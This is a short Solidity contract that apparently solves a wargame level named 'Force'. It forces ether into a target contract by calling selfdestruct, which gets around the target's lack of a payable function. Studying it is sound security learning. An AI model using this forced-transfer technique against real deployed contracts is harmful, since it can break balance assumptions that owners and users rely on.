// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ForceSolution {
    address public instance;

    constructor(address _instance) payable {
        instance = _instance;
    }


    function forceSendEther() public {
        require(address(this).balance > 0, "wont solve level with 0 balance");
        selfdestruct(payable(instance));
    }  
    // contract needs to be able to send receive ether so it can pass it along
    // once it selfdestructs. For this a receive function or a payable fallback function
    // can be implemented. For this example the contract is loaded with ether during
    // deployment
}